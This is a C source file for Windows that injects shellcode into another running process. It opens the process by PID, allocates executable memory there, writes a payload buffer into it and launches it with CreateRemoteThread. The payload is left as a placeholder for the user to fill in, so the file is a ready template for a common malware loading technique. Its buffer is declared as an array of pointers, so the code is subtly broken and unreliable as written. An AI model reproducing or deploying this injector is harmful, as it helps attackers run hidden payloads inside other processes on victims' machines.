#include <Windows.h>
#include <stdio.h>


// Define your shellcode here
const char* gShellcode[] = {};

int InjectRemoteProcess(int pid) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
		return 1;
	}

	// allocate memory in the remote process
	PVOID pAllocatedMemory = VirtualAllocEx(hProcess, NULL, 0x21000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pAllocatedMemory == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return 1;
	}

	// write the payload to the remote process
	if (!WriteProcessMemory(hProcess, pAllocatedMemory, gShellcode, sizeof(gShellcode), NULL)) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return 1;
	}

	// create a remote thread
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return 1;
	}

	return 0;
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return 1;
	}

	int pid = atoi(argv[1]);
	InjectRemoteProcess(pid);
}